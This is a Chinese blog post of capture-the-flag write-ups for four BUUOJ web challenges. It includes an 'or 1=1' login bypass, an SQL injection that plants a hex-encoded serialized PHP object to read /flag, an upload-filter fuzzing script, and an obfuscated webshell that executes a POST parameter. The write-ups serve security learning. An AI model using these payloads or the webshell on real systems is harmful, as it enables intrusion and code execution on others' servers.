<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><title>buu22 - Tlife</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Tlife"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Tlife"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="[MRCTF2020]Ezaudit随手试了一下www.zip&amp;#x3D;&amp;#x3D;又有源码了， 前面就是登陆啥啥啥的，看了一下关键是要有private_key，所以看了一下下面的代码，使用mt_rand构造的公钥和私钥，所以只要我们获得随机数种子就行了   和buu14里面的题目一样的，不过最后要到login.html进行登录，密码可以用万能钥匙’or 1&amp;#x3D;1’1这里有个大坑，以前没有注意过 这里要求php的版本"><meta property="og:type" content="article"><meta property="og:title" content="buu22"><meta property="og:url" content="http://example.com/2021/07/22/buu22/"><meta property="og:site_name" content="Tlife"><meta property="og:description" content="[MRCTF2020]Ezaudit随手试了一下www.zip&amp;#x3D;&amp;#x3D;又有源码了， 前面就是登陆啥啥啥的，看了一下关键是要有private_key，所以看了一下下面的代码，使用mt_rand构造的公钥和私钥，所以只要我们获得随机数种子就行了   和buu14里面的题目一样的，不过最后要到login.html进行登录，密码可以用万能钥匙’or 1&amp;#x3D;1’1这里有个大坑，以前没有注意过 这里要求php的版本"><meta property="og:locale" content="en_US"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210720090352.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210720093849.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721182936.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721183219.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721183423.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721194904.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721195511.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721210801.jpg"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721210800.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721210635.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722084236.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722084333.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722085557.png"><meta property="og:image" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722085725.png"><meta property="article:published_time" content="2021-07-22T13:58:09.000Z"><meta property="article:modified_time" content="2021-07-22T10:42:47.177Z"><meta property="article:author" content="vague huang"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210720090352.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2021/07/22/buu22/"},"headline":"buu22","image":["https://raw.githubusercontent.com/Hwwg/myphoto/master/20210720090352.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210720093849.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721182936.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721183219.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721183423.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721194904.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721195511.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721210801.jpg","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721210800.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721210635.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722084236.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722084333.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722085557.png","https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722085725.png"],"datePublished":"2021-07-22T13:58:09.000Z","dateModified":"2021-07-22T10:42:47.177Z","author":{"@type":"Person","name":"vague huang"},"publisher":{"@type":"Organization","name":"Tlife","logo":{"@type":"ImageObject"}},"description":"[MRCTF2020]Ezaudit随手试了一下www.zip&#x3D;&#x3D;又有源码了， 前面就是登陆啥啥啥的，看了一下关键是要有private_key，所以看了一下下面的代码，使用mt_rand构造的公钥和私钥，所以只要我们获得随机数种子就行了   和buu14里面的题目一样的，不过最后要到login.html进行登录，密码可以用万能钥匙’or 1&#x3D;1’1这里有个大坑，以前没有注意过 这里要求php的版本"}</script><link rel="canonical" href="http://example.com/2021/07/22/buu22/"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@9.12.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body class="is-1-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/">Tlife</a></div><div class="navbar-menu"><div class="navbar-end"></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-12"><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item">Posted&nbsp;<time dateTime="2021-07-22T13:58:09.000Z" title="2021/7/22 下午9:58:09">2021-07-22</time></span><span class="level-item">Updated&nbsp;<time dateTime="2021-07-22T10:42:47.177Z" title="2021/7/22 下午6:42:47">2021-07-22</time></span></div></div><h1 class="title is-3 is-size-4-mobile">buu22</h1><div class="content"><h2 id="MRCTF2020-Ezaudit"><a href="#MRCTF2020-Ezaudit" class="headerlink" title="[MRCTF2020]Ezaudit"></a>[MRCTF2020]Ezaudit</h2><p>随手试了一下<a target="_blank" rel="noopener" href="http://www.zip==又有源码了,/">www.zip==又有源码了，</a></p>
<p>前面就是登陆啥啥啥的，看了一下关键是要有private_key，所以看了一下下面的代码，使用mt_rand构造的公钥和私钥，所以只要我们获得随机数种子就行了</p>
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210720090352.png" alt="img" style="zoom:67%;">

<p>和buu14里面的题目一样的，不过最后要到login.html进行登录，密码可以用万能钥匙’or 1=1’1<br>这里有个大坑，以前没有注意过<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210720093849.png" alt="img" style="zoom:67%;"></p>
<p>这里要求php的版本是要在5.2.1到7.0.x之间的，不然出来的秘钥是不匹配的</p>
<h2 id="GXYCTF2019-StrongestMind"><a href="#GXYCTF2019-StrongestMind" class="headerlink" title="[GXYCTF2019]StrongestMind"></a>[GXYCTF2019]StrongestMind</h2><p>计算成功1000次看起来是要写个脚本<br>改天一定要学学算法，感觉自己写的代码都好冗长，可以去世了，测试是可以的，但是由于现在buu限制了，一下子发送太多请求直接500了，服惹<del>弄了时间间隔也没用，so</del>下一题了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url=<span class="string">&quot;http://e96f1fb4-3b45-487a-ada1-2465e38d9be2.node4.buuoj.cn/&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">r = s.post(url=url).text</span><br><span class="line">r1=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">10000</span>):</span><br><span class="line">    <span class="keyword">if</span> i!=<span class="number">0</span>:</span><br><span class="line">     r=r1</span><br><span class="line">    answer1=re.compile(<span class="string">r&#x27;&lt;br&gt;&lt;br&gt;\d&#123;8&#125;&#x27;</span>,re.S).findall(r)[<span class="number">0</span>].replace(<span class="string">&#x27;&lt;br&gt;&lt;br&gt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    answer2=re.compile(<span class="string">r&#x27;\d&#123;8&#125;&lt;br&gt;&lt;br&gt;&#x27;</span>,re.S).findall(r)[<span class="number">0</span>].replace(<span class="string">&#x27;&lt;br&gt;&lt;br&gt;&#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    sign=re.compile(<span class="string">r&#x27; \W &#x27;</span>,re.S).findall(r)[<span class="number">0</span>].replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    answer1=float(answer1)</span><br><span class="line">    answer2=float(answer2)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;+&#x27;</span> == sign:</span><br><span class="line">        fina_answer=answer1+answer2</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        fina_answer = answer1-answer2</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&quot;answer&quot;</span>:fina_answer</span><br><span class="line">    &#125;</span><br><span class="line">    r1 = s.post(url=url, data=data).text</span><br><span class="line">    <span class="comment">#print(r1)</span></span><br><span class="line">    print(<span class="string">&#x27;*&#x27;</span>*<span class="number">25</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;bingo!&quot;</span> <span class="keyword">in</span> r1:</span><br><span class="line">        print(i)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure>

<h2 id="安洵杯-2019-不是文件上传"><a href="#安洵杯-2019-不是文件上传" class="headerlink" title="[安洵杯 2019]不是文件上传"></a>[安洵杯 2019]不是文件上传</h2><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><p>做题过程中遇到不熟悉的知识点写在前面比较好</p>
<h3 id="php—foreach理解"><a href="#php—foreach理解" class="headerlink" title="php—foreach理解"></a>php—foreach理解</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>];</span><br><span class="line"><span class="keyword">foreach</span>($arr <span class="keyword">as</span> &amp;$value) &#123;</span><br><span class="line">    $value = $value * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// $arr is now [2, 4, 6, 8]</span></span><br><span class="line"><span class="keyword">unset</span>($value); <span class="comment">// 最后取消掉引用</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; &amp;$v) &#123;</span><br><span class="line">    $v = $v * <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//$arr=2 4 6</span></span><br></pre></td></tr></table></figure>

<p>原题目有文件泄露所以直接上github下载一下源码<br>然后开始审计~：<br>在helper.php中看到一处序列化，其中这个my_ext是图片的大小，即宽度和高度<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721182936.png" alt="img" style="zoom:67%;"></p>
<p>getfile()方法，存在check机制<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721183219.png" alt="img" style="zoom:67%;"></p>
<p>严格的白名单检测机制，因为<br><strong>strrchr() 函数</strong><br>（在php中）查找字符在指定字符串中从右面开始的第一次出现的位置，<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721183423.png" alt="img" style="zoom:67%;"><br>这里有个文件读取，但是path似乎被写死了，暂时还没找到利用点<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721194904.png" alt="img" style="zoom:67%;"><br>继续看一下其他文件，在show.php中看到了显示文件的代码，对attr_temp的内容进行反序列化，前面对它是进行了序列化的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721195511.png" alt="img" style="zoom:67%;"></p>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目给了反序列化，但是没看到一些有用的跳板，感觉是要结合数据库进行攻击，最后利用file_get_contents得到flag，但是感觉对于那些值可控有点茫然，所以决定传值跟一下<br>首先是数据库配置：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">create database pic_base</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721210801.jpg" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721210800.png" alt="img" style="zoom:67%;">

<p>可以发现文件名是可控的并且最后是attr参与反序列化，注意到又包含了helper.php，所以感觉是可以进行config值的更改的<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210721210635.png" alt="img" style="zoom:67%;"></p>
<p>所以思路如下：</p>
<p><code>首先构造反序列化对config重新赋值，然后通过sql注入使本来应该title的序列化语句跑到attr字段，然后通过访问该图片，即可获得flag</code><br>构造反序列化语句</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">helper</span></span>&#123;</span><br><span class="line">	<span class="keyword">protected</span> $ifview=<span class="literal">True</span>;</span><br><span class="line">	<span class="keyword">protected</span> $config=<span class="string">&quot;/flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> helper();</span><br><span class="line"><span class="keyword">echo</span> bin2hex(serialize($a);</span><br></pre></td></tr></table></figure>

<p>然后由于这个是protected<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722084236.png" alt="img"></p>
<p>并且题目中对*号做了处理，所以我们对其进行十六进制加密就行了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722084333.png" alt="img"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d</span><br></pre></td></tr></table></figure>

<p>然后构造sql注入语句,抓包改文件名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;1&#39;,&#39;0x4f3a363a2268656c706572223a323a7b733a393a22002a00696676696577223b623a313b733a393a22002a00636f6e666967223b733a353a222f666c6167223b7d&#39;)#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">INSERT INTO images (&#96;title&#96;,&#96;filename&#96;,&#96;ext&#96;,&#96;path&#96;,&#96;attr&#96;) VALUES(&#39;12&#39;,&#39;534b340ce39e1079.jpg&#39;,&#39;jpg&#39;,&#39;pic&#x2F;534b340ce39e1079.jpg&#39;,&#39;a:2:&#123;s:5:&quot;width&quot;;i:969;s:6:&quot;height&quot;;i:335;&#125;&#39;)</span><br></pre></td></tr></table></figure>

<p>成功插入<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722085557.png" alt="img" style="zoom:67%;"><br>获得flag<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20210722085725.png" alt="img"></p>
<h2 id="SUCTF-2018-GetShell"><a href="#SUCTF-2018-GetShell" class="headerlink" title="[SUCTF 2018]GetShell"></a>[SUCTF 2018]GetShell</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>($contents=file_get_contents($_FILES[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]))&#123;</span><br><span class="line">    $data=substr($contents,<span class="number">5</span>);</span><br><span class="line">    <span class="keyword">foreach</span> ($black_char <span class="keyword">as</span> $b) &#123;</span><br><span class="line">        <span class="keyword">if</span> (stripos($data, $b) !== <span class="literal">false</span>)&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;illegal char&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;     </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<p>看源码，他除了源码的前五位不检查，其他都会和黑名单比对，但是我们不知道过滤了啥，所以需要fuzz一下,顺便学习一下如何编写文件上传的脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url =<span class="string">r&quot;http://c86c138f-b79c-45a8-9f85-6841c06aafcc.node4.buuoj.cn/index.php?act=upload&quot;</span></span><br><span class="line">s=requests.session()</span><br><span class="line">headers = s.get(url).headers</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload_post</span>(<span class="params">url</span>):</span></span><br><span class="line">    str_list=[]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        str_list.append(chr(i))</span><br><span class="line">    <span class="keyword">for</span> str <span class="keyword">in</span> str_list:</span><br><span class="line">        file_post=<span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">        -----------------------------380760932532682480232707439734</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;屏幕截图(3).png&quot;</span></span><br><span class="line"><span class="string">Content-Type: image/png</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">12345<span class="subst">&#123;str&#125;</span></span></span><br><span class="line"><span class="string">-----------------------------380760932532682480232707439734</span></span><br><span class="line"><span class="string">Content-Disposition: form-data; name=&quot;submit&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">提交</span></span><br><span class="line"><span class="string">-----------------------------380760932532682480232707439734--</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        r=s.post(url,headers=headers,data=file_post.encode(<span class="string">&#x27;UTF-8&#x27;</span>))</span><br><span class="line">        print(r.text)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Stored&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            print(<span class="string">&quot;该字符可以通过:  &#123;0&#125;&quot;</span>.format(str))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">&quot;过滤字符:  &#123;0&#125;&quot;</span>.format(str))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    upload_post(url)</span><br></pre></td></tr></table></figure>

<p>经过测试可以通过的字符有：<code>$</code>、<code>(</code>、<code>)</code>、<code>.</code>、<code>;</code>、<code>=</code>、<code>[</code>、<code>]</code>、<code>_</code>、<code>~</code>，然后就是汉字了<br>接下里的思路就是思考一下如何构造马去进行上传，如何通过现有字符构造出被过滤的字符，用得一般就是异或操作或者取反，但是异或符号被过滤了，所以这里就用取反去构造</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$__ = [];</span><br><span class="line">$_ = ($__ == $__);<span class="comment">//$_ = 1</span></span><br><span class="line"></span><br><span class="line">$__ = ~(融);</span><br><span class="line">$___ = $__[$_];</span><br><span class="line"><span class="keyword">print</span>($___);<span class="comment">//输出a</span></span><br></pre></td></tr></table></figure>

<p>通过以上方法我们可以构造出我们需要的字母，接下来写一个fuzz脚本：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">header(<span class="string">&#x27;Content-Type: text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">str_split_unicode</span>(<span class="params">$str,$l=<span class="number">0</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>($l&gt;<span class="number">0</span>)&#123;</span><br><span class="line">        $ret=<span class="keyword">array</span>();</span><br><span class="line">        $len=mb_strlen($str,<span class="string">&#x27;UTF-8&#x27;</span>);<span class="comment">//mb_strlen获取长度</span></span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i += $l) &#123;</span><br><span class="line">            $ret[] = mb_substr($str, $i, $l, <span class="string">&quot;UTF-8&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> preg_split(<span class="string">&quot;//u&quot;</span>, $str, <span class="number">-1</span>, PREG_SPLIT_NO_EMPTY);<span class="comment">//preg_split — 通过一个正则表达式分隔字符串，返回汉字</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = <span class="string">&#x27;放你的汉字要多一点才行&#x27;</span>;</span><br><span class="line"></span><br><span class="line">$arr_str=str_split_unicode($s);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ($i=<span class="number">0</span>; $i &lt; strlen($s) ; $i++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> $arr_str[$i].<span class="string">&#x27; ------- &#x27;</span>.~$arr_str[$i][<span class="number">1</span>].<span class="string">&#x27;&lt;br&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来构造马：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>$_=[];$__.=$_;$____=$_==$_;$___=~茉[$____];$___.=~内[$____];$___.=~茉[$____];$___.=~苏[$____];$___.=~的[$____];$___.=~咩[$____];$_____=_;$_____.=~课[$____];$_____.=~尬[$____];$_____.=~笔[$____];$_____.=~端[$____];$__________=$$_____;$___($__________[~瞎[$____]]);</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST:</span><br><span class="line">a&#x3D;env</span><br></pre></td></tr></table></figure>

<p>然后访问环境变量就可以看到flag了，为啥是环境变量=-=，好像是题目出了问题，本来在根目录的，</p>
</div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/2021/07/24/buu23/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">buu23</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/2021/07/22/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"><span class="level-item">GYCTF2020-Ez_Express</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><!--!--></div><!--!--><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/">Tlife</a><p class="is-size-7"><span>&copy; 2023 vague huang</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script><script>moment.locale("en");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><!--!--><script src="/js/main.js" defer></script><!--!--><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script></body></html>